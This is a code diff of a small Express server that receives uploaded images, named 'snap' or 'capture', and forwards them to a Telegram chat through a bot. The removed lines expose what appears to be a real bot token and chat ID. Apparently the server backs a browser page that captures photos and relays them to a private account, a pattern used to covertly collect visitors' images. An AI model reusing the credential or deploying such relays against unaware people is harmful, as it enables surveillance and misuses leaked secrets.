@@ -1,39 +1,56 @@
 const express = require('express');
-const path = require('path');
-const cors = require('cors');
-const fetch = require('node-fetch');
+const multer = require('multer');
 const FormData = require('form-data');
+const fetch = require('node-fetch');
+const path = require('path');
 
 const app = express();
+const upload = multer({ storage: multer.memoryStorage() });
+
+// --- CONFIGURATION ---
+const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+const CHAT_ID = 'YOUR_CHAT_ID';
 const PORT = process.env.PORT || 3000;
 
-const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
-const CHAT_ID = '5574741182';
+app.use(express.static('public'));
 
-app.use(cors());
-app.use(express.json({ limit: '12mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
+// The endpoint must match the fetch URL in your index.html
+app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
+    try {
+        if (!req.file) {
+            return res.status(400).json({ error: 'No file uploaded' });
+        }
 
-app.post('/api/upload-photo', async (req, res) => {
-  try {
-    const { dataUrl } = req.body;
-    const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
-    if (!matches) return res.status(400).json({ ok: false });
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        
+        // Prepare data for Telegram
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', req.file.buffer, {
+            filename: 'capture.jpg',
+            contentType: 'image/jpeg',
+        });
 
-    const buffer = Buffer.from(matches[2], 'base64');
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', buffer, { filename: 'snap.jpg' });
+        const response = await fetch(telegramUrl, {
+            method: 'POST',
+            body: form
+        });
 
-    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: form
-    });
-    const json = await resp.json();
-    res.json(json);
-  } catch (err) {
-    res.status(500).json({ ok: false });
-  }
+        const result = await response.json();
+
+        if (result.ok) {
+            console.log("✅ Photo sent to Telegram");
+            res.json({ success: true });
+        } else {
+            console.error("❌ Telegram Error:", result);
+            res.status(500).json({ error: result.description });
+        }
+    } catch (error) {
+        console.error("Internal Server Error:", error);
+        res.status(500).json({ error: 'Server error' });
+    }
 });
 
-app.listen(PORT, () => console.log(`Server on ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`🚀 Server running at http://localhost:${PORT}`);
+});
